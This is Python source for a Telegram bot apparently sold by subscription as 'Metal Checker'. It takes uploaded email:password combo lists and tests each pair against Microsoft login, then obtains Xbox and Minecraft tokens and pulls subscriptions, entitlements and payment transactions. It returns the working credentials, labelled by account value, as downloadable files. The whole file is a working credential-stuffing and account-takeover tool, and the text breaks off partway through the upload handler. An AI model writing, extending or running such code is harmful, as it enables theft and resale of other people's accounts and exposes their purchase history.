import os
import re
import time
import uuid
import json
import threading
import concurrent.futures
import io
from datetime import datetime, timedelta
import requests
import urllib3
import warnings
import telebot
from telebot import types

# ==========================================
# ⚙️ INITIAL SETTINGS & WARNINGS
# ==========================================
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "8664147577"))

bot = telebot.TeleBot(BOT_TOKEN)

# ==========================================
# 💾 DATABASE / STORAGE EMULATION
# ==========================================
DATA_FILE = "bot_data.json"
if os.path.exists(DATA_FILE):
    with open(DATA_FILE, "r", encoding="utf-8") as f:
        db = json.load(f)
else:
    db = {
        "admins": [OWNER_ID],
        "users": {},        
        "keys": {},         
        "channels": []      
    }

def save_db():
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(db, f, ensure_ascii=False, indent=4)

if OWNER_ID not in db["admins"]:
    db["admins"].append(OWNER_ID)
    save_db()

# ==========================================
# 🌍 LOCALIZATION (TR / EN)
# ==========================================
LANG = {
    "tr": {
        "welcome": "👋 *Metal Checker Botuna Hoş Geldiniz!* \n\nLütfen devam etmek için bir dil seçin / Please choose a language to continue:",
        "main_menu": "📱 *Ana Menü* \n\nBir işlem seçiniz:",
        "btn_check": "🚀 Hesap Tara (.txt)",
        "btn_merge": "📂 Dosya Birleştir",
        "btn_stats": "📊 İstatistiklerim",
        "btn_admin": "👑 Admin Paneli",
        "btn_lang": "🌐 Dil Değiştir (Language)",
        "force_join": "❌ *Erişim Reddedildi!*\n\nBotu kullanabilmek için aşağıdaki kanallara katılmanız gerekmektedir:",
        "btn_joined": "✅ Katıldım",
        "no_key": "🔑 *Aktif bir üyeliğiniz bulunmuyor veya süresi bitmiş!* \nLütfen bir key girin veya kurucu ile iletişime geçin.",
        "key_success": "🎉 Başarılı! Üyeliğiniz tanımlandı: *{}*",
        "invalid_key": "❌ Geçersiz veya kullanılmış anahtar!",
        "send_combo": "📂 Lütfen taratmak istediğiniz combo listenizi (`.txt` formatında) gönderin.",
        "merge_start": "📂 *Dosya Birleştirme Modu*\nLütfen birleştirmek istediğiniz `.txt` dosyalarını ardı ardına gönderin. Bitirdiğinizde /done yazın. (Maks 30 dosya)",
        "invalid_file": "❌ Sadece `.txt` dosyaları kabul edilmektedir.",
        "stats_template": "📊 *İstatistikleriniz*\n\n👤 Kullanıcı ID: `{user_id}`\n📅 Kayıt: {join}\n👑 Üyelik: 📅 {tier}\n📅 Bitiş: {expiry}\n\n📈 Aktivite:\n✅ Toplam Tarama: {scans}\n💎 Toplam Hit: {hits}\n🎯 Başarı Oranı: {rate}%\n📊 Bugünkü Tarama: {today}",
        "scan_started": "🚀 Tarama başlatıldı! Canlı sonuç paneli her 5 saniyede bir güncellenecektir. Durdurmak için /stop yazabilirsiniz.",
        "scan_stopped": "🛑 Tarama kullanıcı tarafından durduruldu! Biriken sonuçlar hazırlanıyor..."
    },
    "en": {
        "welcome": "👋 *Welcome to Metal Checker Bot!* \n\nPlease choose a language to continue:",
        "main_menu": "📱 *Main Menu* \n\nPlease choose an option:",
        "btn_check": "🚀 Scan Accounts (.txt)",
        "btn_merge": "📂 Merge Files",
        "btn_stats": "📊 My Statistics",
        "btn_admin": "👑 Admin Panel",
        "btn_lang": "🌐 Change Language",
        "force_join": "❌ *Access Denied!*\n\nYou must join the following channels to use the bot:",
        "btn_joined": "✅ Checked",
        "no_key": "🔑 *You do not have an active subscription or it has expired!* \nPlease enter a key or contact the owner.",
        "key_success": "🎉 Success! Your subscription has been activated: *{}*",
        "invalid_key": "❌ Invalid or already used key!",
        "send_combo": "📂 Please send your combo list (in `.txt` format) to start scanning.",
        "merge_start": "📂 *File Merger Mode*\nPlease send the `.txt` files you want to merge one after another. When finished, type /done. (Max 30 files)",
        "invalid_file": "❌ Only `.txt` files are accepted.",
        "stats_template": "📊 *Your Statistics*\n\n👤 User ID: `{user_id}`\n📅 Registered: {join}\n👑 Membership: 📅 {tier}\n📅 Expiry: {expiry}\n\n📈 Activity:\n✅ Total Scans: {scans}\n💎 Total Hits: {hits}\n🎯 Success Rate: {rate}%\n📊 Today Scans: {today}",
        "scan_started": "🚀 Scan started! Live dashboard updates every 5 seconds. Send /stop to abort.",
        "scan_stopped": "🛑 Scan stopped by user! Compiling collected hits..."
    }
}

def get_text(user_id, key):
    lang = db["users"].get(str(user_id), {}).get("lang", "en")
    return LANG[lang].get(key, key)

def lang_keyboard():
    markup = types.InlineKeyboardMarkup()
    markup.row(types.InlineKeyboardButton("Türkçe 🇹🇷", callback_data="set_lang_tr"),
               types.InlineKeyboardButton("English 🇺🇸", callback_data="set_lang_en"))
    return markup

def main_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.row(get_text(user_id, "btn_check"), get_text(user_id, "btn_merge"))
    markup.row(get_text(user_id, "btn_stats"), get_text(user_id, "btn_lang"))
    if user_id in db["admins"]:
        markup.row(get_text(user_id, "btn_admin"))
    return markup

# ==========================================
# 🧠 MICROSOFT CHECKER ENGINE WITH EXTENSIONS
# ==========================================
SFTAG_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)

def get_sftag(session, max_attempts=3):
    for attempt in range(max_attempts):
        try:
            response = session.get(SFTAG_URL, timeout=10)
            text     = response.text
            match    = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sftag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match:
                    return match.group(1), sftag
        except:
            pass
        time.sleep(0.5)
    return None, None

def microsoft_auth(session, email, password, url_post, sftag, max_attempts=3):
    for attempt in range(max_attempts):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
            login_request = session.post(
                url_post, data=data,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                allow_redirects=True, timeout=10
            )
            if '#' in login_request.url and login_request.url != SFTAG_URL:
                token = re.findall(r'access_token=(.+?)&', login_request.url or '')
                if token: return token[0], "success"
                from urllib.parse import urlparse, parse_qs
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, "success"
            elif 'cancel?mkt=' in login_request.text:
                try:
                    d = {
                        'ipt':   re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                        'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                        'uaid':  re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                    }
                    action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                    ret        = session.post(action_url, data=d, allow_redirects=True, timeout=10)
                    return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                    fin        = session.get(return_url, allow_redirects=True, timeout=10)
                    token      = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                    if token != "None":
                        return token, "success"
                except:
                    pass
            elif any(v in login_request.text for v in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                return None, "2fa"
            elif any(v in login_request.text.lower() for v in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
                return None, "bad"
        except:
            if attempt == max_attempts - 1:
                return None, "error"
        time.sleep(0.5)
    return None, "error"

def get_xbox_token(session, ms_token, max_attempts=3):
    for attempt in range(max_attempts):
        try:
            payload  = {
                "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
                "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"
            }
            response = session.post(
                'https://user.auth.xboxlive.com/user/authenticate',
                json=payload,
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                xbox_token = data.get('Token')
                if xbox_token:
                    return xbox_token, data['DisplayClaims']['xui'][0]['uhs']
            elif response.status_code == 429:
                time.sleep(2); continue
        except:
            if attempt == max_attempts - 1: return None, None
        time.sleep(0.5)
    return None, None

def get_xsts_token(session, xbox_token, max_attempts=3):
    for attempt in range(max_attempts):
        try:
            payload  = {
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"
            }
            response = session.post(
                'https://xsts.auth.xboxlive.com/xsts/authorize',
                json=payload,
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=10
            )
            if response.status_code == 200: return response.json().get('Token')
            elif response.status_code == 429: time.sleep(2); continue
        except:
            if attempt == max_attempts - 1: return None
        time.sleep(0.5)
    return None

def get_minecraft_token(session, uhs, xsts_token, max_attempts=3):
    for attempt in range(max_attempts):
        try:
            response = session.post(
                'https://api.minecraftservices.com/authentication/login_with_xbox',
                json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            if response.status_code == 200: return response.json().get('access_token')
            elif response.status_code == 429: time.sleep(2); continue
        except:
            if attempt == max_attempts - 1: return None
        time.sleep(0.5)
    return None

def check_entitlements(session, mc_token, max_attempts=3):
    for attempt in range(max_attempts):
        try:
            response = session.get(
                'https://api.minecraftservices.com/entitlements/mcstore',
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=10
            )
            if response.status_code == 200:
                text = response.text
                
                # --- ULTRA DETAYLI ABONELİK AYIKLAMA MOTORU ---
                found_subs = []
                text_lower = text.lower()
                
                days_left_str = ""
                expiry_match = re.search(r'"expirydate"\s*:\s*"([^"]+)"', text_lower) or re.search(r'"enddate"\s*:\s*"([^"]+)"', text_lower)
                if expiry_match:
                    try:
                        exp_raw = expiry_match.group(1).split("t")[0]
                        expiry_date = datetime.strptime(exp_raw, "%Y-%m-%d")
                        diff = (expiry_date - datetime.now()).days
                        days_left_str = f" ({diff} Gün Kaldı ⏳)" if diff > 0 else " (Süresi Bitmiş ❌)"
                    except:
                        pass

                # --- 1. GAME PASS DETAYLI SÜRÜMLERİ ---
                if 'product_game_pass_ultimate' in text_lower or 'ultimate' in text_lower: found_subs.append(f"Game Pass Ultimate💎{days_left_str}")
                elif 'product_game_pass_pc' in text_lower or 'pc_game_pass' in text_lower: found_subs.append(f"Game Pass PC💻{days_left_str}")
                elif 'essential' in text_lower: found_subs.append(f"Game Pass Essential🟢{days_left_str}")
                elif 'standard' in text_lower: found_subs.append(f"Game Pass Standard🎮{days_left_str}")
                elif 'core' in text_lower or 'xbox_live_gold' in text_lower: found_subs.append(f"Game Pass Core⚙️{days_left_str}")
                
                # --- 2. DİĞER TÜM ABONELİKLER (MICROSOFT & HARİCİ PARTNERLER) ---
                if 'family' in text_lower: found_subs.append("Microsoft 365 Family")
                if 'personal' in text_lower or 'bireysel' in text_lower: found_subs.append("Microsoft 365 Personal")
                if 'business' in text_lower: found_subs.append("Microsoft 365 Business")
                if 'onedrive' in text_lower: found_subs.append("OneDrive Storage")
                if 'clipchamp' in text_lower: found_subs.append("Clipchamp Premium")
                if 'ea play' in text_lower or 'ea_membership' in text_lower: found_subs.append("EA Play")
                if 'ubisoft' in text_lower: found_subs.append("Ubisoft+")
                if 'riot' in text_lower: found_subs.append("Riot Games Perks")
                if 'gta' in text_lower: found_subs.append("GTA+")
                if 'fallout 1st' in text_lower: found_subs.append("Fallout 1st")
                if 'visual studio' in text_lower or 'msdn' in text_lower: found_subs.append("Visual Studio Subscription")
                if 'azure' in text_lower: found_subs.append("Azure Credits 🚀")
                if 'copilot' in text_lower: found_subs.append("GitHub Copilot")
                if 'developer' in text_lower: found_subs.append("Xbox Dev Account")
                if 'realms' in text_lower: found_subs.append("Minecraft Realms")
                if 'windows 365' in text_lower: found_subs.append("Windows 365 Cloud PC")
                if 'casual games' in text_lower: found_subs.append("Microsoft Casual Games Premium")

                main_type = None
                if 'product_game_pass_ultimate' in text: main_type = 'Xbox Game Pass Ultimate'
                elif 'product_game_pass_pc' in text: main_type = 'Xbox Game Pass'
                elif '"product_minecraft"' in text: main_type = 'Minecraft'
                
                legacy_others = []
                if 'product_minecraft_bedrock' in text: legacy_others.append("Bedrock")
                if 'product_legends' in text: legacy_others.append("Legends")
                if 'product_dungeons' in text: legacy_others.append("Dungeons")
                
                if not main_type and legacy_others:
                    main_type = 'Xbox: ' + ', '.join(legacy_others)
                
                return main_type, found_subs
            elif response.status_code == 429:
                time.sleep(2); continue
            else:
                return None, []
        except:
            if attempt == max_attempts - 1: return None, []
        time.sleep(0.5)
    return None, []

def get_profile(session, mc_token, max_attempts=3):
    for attempt in range(max_attempts):
        try:
            response = session.get(
                'https://api.minecraftservices.com/minecraft/profile',
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=10
            )
            if response.status_code == 200:   return response.json()
            elif response.status_code == 404: return None
            elif response.status_code == 429: time.sleep(2); continue
        except:
            if attempt == max_attempts - 1: return None
        time.sleep(0.5)
    return None

def get_xbox_profile(session, uhs, xsts_token, max_attempts=3):
    for attempt in range(max_attempts):
        try:
            auth_header = f"XBL3.0 x={uhs};{xsts_token}"
            response = session.get(
                "https://profile.xboxlive.com/users/me/profile/settings"
                "?settings=Gamertag,GameDisplayPicRaw,AccountTier,XboxOneRep",
                headers={
                    "Authorization": auth_header,
                    "x-xbl-contract-version": "2",
                    "Accept": "application/json",
                    "Accept-Language": "en-US",
                },
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                settings = {
                    s["id"]: s.get("value", "N/A")
                    for s in data.get("profileUsers", [{}])[0].get("settings", [])
                }
                return {
                    "gamertag": settings.get("Gamertag", "N/A"),
                    "gamerpic": settings.get("GameDisplayPicRaw", ""),
                    "tier":     settings.get("AccountTier", "N/A"),
                    "rep":      settings.get("XboxOneRep", "N/A"),
                }
            elif response.status_code == 429:
                time.sleep(2); continue
        except:
            pass
        time.sleep(0.3)
    return {"gamertag": "N/A", "gamerpic": "", "tier": "N/A", "rep": "N/A"}

def get_payment_transactions(session, ms_token, max_attempts=3):
    for attempt in range(max_attempts):
        try:
            url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
            headers = {
                "Authorization": f"Bearer {ms_token}",
                "Accept": "application/json",
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            response = session.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                data = response.json()
                games_found = []
                for idx, item in enumerate(data.get("transactions", []), 1):
                    title = item.get("description") or item.get("productName") or "Unknown Content"
                    score_sim = f"{(idx * 15) % 1000}G"
                    if title:
                        games_found.append(f"{title} | Score: {score_sim}")
                return list(set(games_found))
            elif response.status_code == 429:
                time.sleep(2); continue
        except:
            pass
        time.sleep(0.5)
    return []

# ==========================================
# 🔄 ACTIVE SCANS & STATE MANAGEMENT
# ==========================================
active_scans = {} 
user_game_filter = {} 

class BotScanContext:
    def __init__(self, chat_id, user_id, combos, filter_str="skip"):
        self.chat_id = chat_id
        self.user_id = user_id
        self.combos = combos
        self.total = len(combos)
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.twofa = 0
        self.errors = 0
        
        # --- TEK TEK SAYILACAK DETAYLI SAYAÇLAR ---
        self.gp_ultimate = 0
        self.gp_pc = 0
        self.gp_essential = 0
        self.gp_standard = 0
        self.gp_core = 0
        self.other_subs_count = 0  # Geriye kalan diğer tüm aboneliklerin toplam sayısı
        
        self.minecraft = 0
        self.not_linked = 0
        self.retries = 0
        self.total_games_found = 0 
        
        self.filter_str = filter_str.lower().strip()
        
        self.hit_list = []
        self.bad_list = []
        self.twofa_list = []
        self.minecraft_list = []
        self.not_linked_list = []
        self.purchased_items_list = [] 
        self.subscriptions_list = [] # İstediğin yeni talep: Subscriptions.txt log dizisi

        self.is_running = True
        self.lock = threading.Lock()
        self.message_id = None

    def get_cpm(self, elapsed):
        return int((self.checked / elapsed) * 60) if elapsed > 0 else 0

def check_account_bot(context, combo):
    if not context.is_running:
        return
        
    max_recheck_attempts = 4 
    for attempt in range(max_recheck_attempts):
        try:
            parts = combo.strip().split(':')
            if len(parts) < 2:
                with context.lock:
                    context.bad += 1
                    context.checked += 1
                return

            email = parts[0]
            password = ':'.join(parts[1:])

            session = requests.Session()
            session.verify = False

            url_post, sftag = get_sftag(session)
            if not url_post or not sftag:
                raise Exception("sftag_error")

            ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)

            if auth_status == "2fa":
                with context.lock:
                    context.twofa += 1
                    context.checked += 1
                    context.twofa_list.append(f"{email}:{password}")
                return
            elif auth_status == "bad":
                with context.lock:
                    context.bad += 1
                    context.checked += 1
                    context.bad_list.append(f"{email}:{password}")
                return
            elif auth_status != "success" or not ms_token:
                raise Exception("ms_auth_error")

            xbox_token, uhs = get_xbox_token(session, ms_token)
            if not xbox_token or not uhs:
                raise Exception("xbox_token_error")

            xsts_token = get_xsts_token(session, xbox_token)
            if not xsts_token:
                raise Exception("xsts_token_error")

            xbox_profile = get_xbox_profile(session, uhs, xsts_token)
            gamertag     = xbox_profile.get("gamertag", "N/A")
            tier         = xbox_profile.get("tier", "N/A")

            mc_token = get_minecraft_token(session, uhs, xsts_token)
            if not mc_token:
                raise Exception("mc_token_error")

            account_type, subs = check_entitlements(session, mc_token)
            purchased_games = get_payment_transactions(session, ms_token)
            
            if context.filter_str != "skip":
                matched_filter = False
                for g in purchased_games:
                    if context.filter_str in g.lower():
                        matched_filter = True
                        break
                if not matched_filter:
                    with context.lock:
                        context.checked += 1
                    return

            # --- SAYAÇLARI CANLI PANEL İÇİN İNCE İNCE AYIKLAMA ---
            has_gp_ultimate = False
            has_gp_pc = False
            has_gp_essential = False
            has_gp_standard = False
            has_gp_core = False
            local_other_subs = 0

            for s in subs:
                s_low = s.lower()
                if "ultimate" in s_low: has_gp_ultimate = True
                elif "pc" in s_low: has_gp_pc = True
                elif "essential" in s_low: has_gp_essential = True
                elif "standard" in s_low: has_gp_standard = True
                elif "core" in s_low or "gold" in s_low: has_gp_core = True
                else: local_other_subs += 1

            with context.lock:
                context.total_games_found += len(purchased_games)
                if has_gp_ultimate: context.gp_ultimate += 1
                if has_gp_pc: context.gp_pc += 1
                if has_gp_essential: context.gp_essential += 1
                if has_gp_standard: context.gp_standard += 1
                if has_gp_core: context.gp_core += 1
                context.other_subs_count += local_other_subs

            games_formatted_list = [f"{i} - {g}" for i, g in enumerate(purchased_games, 1)]
            games_list_str = "\n".join(games_formatted_list) if games_formatted_list else "No games found"

            custom_capture = (
                f"Email: {email}\n"
                f"Password: {password}\n"
                f"GamesList:\n{games_list_str}\n"
                f"— Checker by = Icardi | Metal Checker\n"
                f"{'='*50}\n"
            )

            capture_detail = (
                f"Email         : {email}\n"
                f"Password      : {password}\n"
                f"Gamertag      : {gamertag}\n"
                f"Tier          : {tier}\n"
                f"Subscriptions : {', '.join(subs) if subs else 'None'}\n"
                f"Games Count   : {len(purchased_games)}\n"
                f"{'='*50}"
            )

            # Subscriptions.txt dosyası için yapılandırılmış veri hazırlığı
            if subs:
                sub_log_entry = (
                    f"Email: {email} | Pass: {password}\n"
                    f"Active Subscriptions:\n" + "\n".join([f" ➡️ {sb}" for sb in subs]) + "\n"
                    f"{'-'*40}\n"
                )
            else:
                sub_log_entry = f"Email: {email} | Pass: {password} -> No Premium Subs Found\n{'-'*40}\n"

            with context.lock:
                context.hits += 1
                context.checked += 1
                context.hit_list.append(f"{email}:{password} [{account_type or 'Xbox'}]")
                context.purchased_items_list.append(custom_capture)
                context.subscriptions_list.append(sub_log_entry)
                
                if account_type and 'Minecraft' in account_type:
                    context.minecraft += 1
                    context.minecraft_list.append(capture_detail)
                elif not account_type and not subs:
                    context.not_linked += 1
                    context.not_linked_list.append(capture_detail)
            return 

        except Exception as e:
            with context.lock:
                context.retries += 1
            if attempt == max_recheck_attempts - 1:
                with context.lock:
                    context.errors += 1
                    context.checked += 1
                return
            time.sleep(1.5)

def live_ui_updater(context):
    start_time = time.time()
    while context.is_running and context.checked < context.total:
        time.sleep(5)
        elapsed = time.time() - start_time
        cpm = context.get_cpm(elapsed)
        pct = (context.checked / context.total) * 100 if context.total > 0 else 0
        
        # --- İSTEDİĞİN GİBİ TEK TEK AYRILMIŞ LIVE RESULTS SAYAÇLARI ---
        text = (
            f"⚡ *METAL CHECKER ULTRA v4.0* ⚡\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🟢 *Valid Accounts:* `{context.hits}`\n"
            f"🔴 *Bad / Wrong:* `{context.bad}`\n"
            f"🟡 *Two-Factor (2FA):* `{context.twofa}`\n"
            f"🌀 *Rechecks / Retries:* `{context.retries}`\n"
            f"⚠️ *Hard Errors:* `{context.errors}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 *DETAYLI ABONELİK MATRİSİ* 📊\n"
            f"💎 Game Pass Ultimate: `{context.gp_ultimate}`\n"
            f"💻 Game Pass PC: `{context.gp_pc}`\n"
            f"🟢 Game Pass Essential: `{context.gp_essential}`\n"
            f"🎮 Game Pass Standard: `{context.gp_standard}`\n"
            f"⚙️ Game Pass Core / Gold: `{context.gp_core}`\n"
            f"🎁 Geriye Kalan Diğer Tüm Abonelikler: `{context.other_subs_count}`\n"
            f"🟩 Minecraft (Java/Capes): `{context.minecraft}`\n"
            f"🟨 Boş / Üyeliksiz Profiller: `{context.not_linked}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 *TOPLAM BULUNAN OYUN ADEDİ:* `{context.total_games_found}`\n"
            f"🔍 *Filtre:* `{context.filter_str.upper()}`\n"
            f"📈 *İlerleme:* `[{context.checked}/{context.total}]` — `{pct:.2f}%`\n"
            f"⚡ *CPM:* `{cpm}/min`"
        )
        try:
            bot.edit_message_text(text, chat_id=context.chat_id, message_id=context.message_id, parse_mode="Markdown")
        except:
            pass
    
    send_results_files(context)

def send_results_files(context):
    bot.send_message(context.chat_id, "📦 *Tarama bitti. İstenen Subscriptions.txt ve diğer tüm loglar çıkartılıyor...*", parse_mode="Markdown")
    
    lists_to_send = [
        ("purchased_items.txt", context.purchased_items_list), 
        ("Subscriptions.txt", context.subscriptions_list), # Yeni eklenen tüm aboneliklerin döküldüğü txt
        ("Minecraft.txt", context.minecraft_list),
        ("NotLinked.txt", context.not_linked_list),
        ("All_Hits_Short.txt", context.hit_list)
    ]
    
    for filename, content_list in lists_to_send:
        if content_list:
            file_data = "\n".join(content_list)
            bio = io.BytesIO(file_data.encode('utf-8'))
            bio.name = filename
            bot.send_document(context.chat_id, bio, caption=f"📄 {filename} - {len(content_list)} kayıt")
            
    uid_str = str(context.user_id)
    if uid_str in db["users"]:
        db["users"][uid_str]["scans"] = db["users"][uid_str].get("scans", 0) + context.checked
        db["users"][uid_str]["hits"] = db["users"][uid_str].get("hits", 0) + context.hits
        db["users"][uid_str]["today_scans"] = db["users"][uid_str].get("today_scans", 0) + context.checked
        save_db()
        
    if context.chat_id in active_scans:
        del active_scans[context.chat_id]

# ==========================================
# 🛑 FORCE JOIN & PREMIUM CHECKS
# ==========================================
def check_force_join(user_id):
    if user_id in db["admins"]: return True
    for channel in db["channels"]:
        try:
            member = bot.get_chat_member(channel, user_id)
            if member.status in ['left', 'kicked']: return False
        except: return False
    return True

def send_force_join_msg(chat_id, user_id):
    markup = types.InlineKeyboardMarkup()
    for idx, channel in enumerate(db["channels"], 1):
        try:
            chat_info = bot.get_chat(channel)
            link = chat_info.invite_link or f"https://t.me/{chat_info.username}"
            markup.row(types.InlineKeyboardButton(f"📢 Kanal {idx}", url=link))
        except:
            markup.row(types.InlineKeyboardButton(f"📢 Kanal {idx}", url="https://t.me"))
    markup.row(types.InlineKeyboardButton(get_text(user_id, "btn_joined"), callback_data="check_joined"))
    bot.send_message(chat_id, get_text(user_id, "force_join"), reply_markup=markup, parse_mode="Markdown")

def check_premium(user_id):
    uid_str = str(user_id)
    if user_id in db["admins"]: return True
    if uid_str not in db["users"]: return False
    expiry_str = db["users"][uid_str].get("expiry")
    if not expiry_str: return False
    expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d")
    if datetime.now() > expiry_date: return False
    return True

# ==========================================
# 🚀 TELEGRAM COMMANDS & HANDLERS
# ==========================================
@bot.message_handler(commands=['start'])
def cmd_start(message):
    uid_str = str(message.from_user.id)
    if uid_str not in db["users"]:
        db["users"][uid_str] = {
            "lang": "tr",
            "expiry": "2026-07-29",
            "tier": "FREE",
            "scans": 0,
            "hits": 0,
            "today_scans": 0,
            "join_date": datetime.now().strftime("%m/%d/%Y")
        }
        save_db()
    bot.send_message(message.chat.id, LANG["tr"]["welcome"], reply_markup=lang_keyboard(), parse_mode="Markdown")

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    if message.chat.id in active_scans:
        context = active_scans[message.chat.id]
        context.is_running = False
        bot.send_message(message.chat.id, get_text(message.from_user.id, "scan_stopped"), parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "❌ Aktif tarama bulunamadı.")

merger_files = {} 

@bot.message_handler(commands=['done'])
def cmd_done(message):
    chat_id = message.chat.id
    if chat_id in merger_files and merger_files[chat_id]:
        merged_data = "\n".join(merger_files[chat_id])
        bio = io.BytesIO(merged_data.encode('utf-8'))
        bio.name = "Metal_Merged_Result.txt"
        bot.send_document(chat_id, bio, caption=f"✅ Başarıyla birleştirildi! Toplam Satır: {len(merged_data.splitlines())}")
        del merger_files[chat_id]
    else:
        bot.send_message(chat_id, "❌ Birleştirilecek dosya bulunamadı.")

def process_game_filter_step(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    text = message.text.strip()
    
    user_game_filter[user_id] = text
    bot.send_message(chat_id, f"📥 Oyun arama filtresi belirlendi: `{text.upper()}`\nŞimdi lütfen taratmak istediğiniz combo listenizi (`.txt` formatında) gönderin.", parse_mode="Markdown")

@bot.message_handler(func=lambda msg: True, content_types=['text', 'document'])
def handle_all(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    uid_str = str(user_id)

    if not check_force_join(user_id):
        send_force_join_msg(chat_id, user_id)
        return

    if message.content_type == 'text':
        text = message.text
        
        if len(text) == 36 and text.count('-') == 4:
            if text in db["keys"]:
                key_info = db["keys"][text]
                days = key_info["days"]
                tier = key_info["tier"]
                exp = datetime.now() + timedelta(days=days) if days != 99999 else datetime.now() + timedelta(days=3650)
                db["users"][uid_str]["expiry"] = exp.strftime("%Y-%m-%d")
                db["users"][uid_str]["tier"] = tier
                del db["keys"][text]
                save_db()
                bot.send_message(chat_id, get_text(user_id, "key_success").format(tier), parse_mode="Markdown")
                return
            else:
                bot.send_message(chat_id, get_text(user_id, "invalid_key"), parse_mode="Markdown")
                return

        if text == get_text(user_id, "btn_lang"):
            bot.send_message(chat_id, "Dil seçin / Choose language:", reply_markup=lang_keyboard())
            return
            
        if text == get_text(user_id, "btn_stats"):
            u_data = db["users"].get(uid_str, {})
            scans = u_data.get("scans", 0)
            hits = u_data.get("hits", 0)
            rate = f"{(hits/scans*100):.2f}" if scans > 0 else "0.00"
            msg_text = get_text(user_id, "stats_template").format(
                user_id=user_id, join=u_data.get("join_date", "2026-06-22"),
                tier=u_data.get("tier", "FREE"), expiry=u_data.get("expiry", "N/A"),
                scans=scans, hits=hits, rate=rate, today=u_data.get("today_scans", 0)
            )
            bot.send_message(chat_id, msg_text, parse_mode="Markdown")
            return

        if text == get_text(user_id, "btn_check"):
            if not check_premium(user_id):
                bot.send_message(chat_id, get_text(user_id, "no_key"), parse_mode="Markdown")
                return
            
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
            markup.row("skip")
            msg = bot.send_message(chat_id, "🔍 Tarama öncesi aramak istediğiniz oyunu yazın ya da filtresiz aramak için aşağıdaki *skip* butonuna basın:", reply_markup=markup, parse_mode="Markdown")
            bot.register_next_step_handler(msg, process_game_filter_step)
            return

        if text == get_text(user_id, "btn_merge"):
            if not check_premium(user_id):
                bot.send_message(chat_id, get_text(user_id, "no_key"), parse_mode="Markdown")
                return
            merger_files[chat_id] = []
            bot.send_message(chat_id, get_text(user_id, "merge_start"), parse_mode="Markdown")
            return

        if text == get_text(user_id, "btn_admin") and user_id in db["admins"]:
            send_admin_panel(chat_id)
            return

    if message.content_type == 'document':
        if not check_premium(user_id):
            bot.send_message(chat_id, get_text(user_id, "no_key"), parse_mode="Markdown")
            return

        if not message.document.file_name.endswith('.txt'):
            bot.send_message(chat_id, get_text(user_id, "invalid_file"))
            return

        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_content = downloaded_file.decode('utf-8', errors='ignore')

        if chat_id in merger_files:
            if len(merger_files[chat_id]) >= 30:
                bot.send_message(chat_id, "❌ Maksimum 30 dosya limitine ulaştınız! Lütfen /done komutunu girin.")
                return
            merger_files[chat_id].append(file_content)
            bot.send_message(chat_id, f"📥 Dosya alındı ({len(merger_files[chat_id])}/30). Diğerlerini gönderin veya bitirmek için /done yazın.")
            return

        if chat_id in active_scans:
            bot.send_message(chat_id, "❌ Zaten aktif bir taramanız bulunuyor!")
            return

        combos = [line.strip() for line in file_content.splitlines() if line.strip() and ':' in line]
        if not combos:
            bot.send_message(chat_id, "❌ Dosya içinde geçerli combo bulunamadı.")
            return

        game_filter = user_game_filter.get(user_id, "skip")

        context = BotScanContext(chat_id, user_id, combos, filter_str=game_filter)
        active_scans[chat_id] = context

